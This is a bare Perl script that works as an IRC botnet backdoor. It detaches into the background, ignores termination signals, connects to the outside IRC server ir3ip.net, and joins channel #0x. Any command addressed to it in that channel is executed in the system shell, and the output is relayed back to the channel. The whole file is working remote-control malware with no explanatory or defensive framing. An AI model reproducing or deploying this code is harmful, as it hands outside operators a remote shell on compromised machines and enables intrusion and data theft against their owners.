   #!/usr/bin/perl
   $chan      = "#0x";
   $nick      = "k";
   $server    = "ir3ip.net";
   $SIG{TERM} = {};
   exit if fork;
   use IO::Socket;
   $sock = IO::Socket::INET->new( $server . ":6667" ) || exit;
   print $sock "USER k +i k :kv1\nNICK k\n";
   $i = 1;

   while ( <$sock> =~ /^[^ ]+ ([^ ]+) / ) {
       $mode = $1;
       last if $mode == "001";
       if ( $mode == "433" ) {
           $i++;
           $nick =~ s/\d*$/$i/;
           print $sock "NICK $nick\n";
       }
   }
   print $sock "JOIN $chan\nPRIVMSG $chan :Hi\n";
   while (<$sock>) {
       if (/^PING (.*)$/) { print $sock "PONG $1\nJOIN $chan\n"; }
       if (s/^[^ ]+ PRIVMSG $chan :$nick[^ :\w]*:[^ :\w]* (.*)$/$1/) {
           s/\s*$//;
           $_ = `$_`;
           foreach ( split "\n" ) { print $sock "PRIVMSG $chan :$_\n"; sleep 1; }
       }
   }    #/tmp/hi/tmp/hi
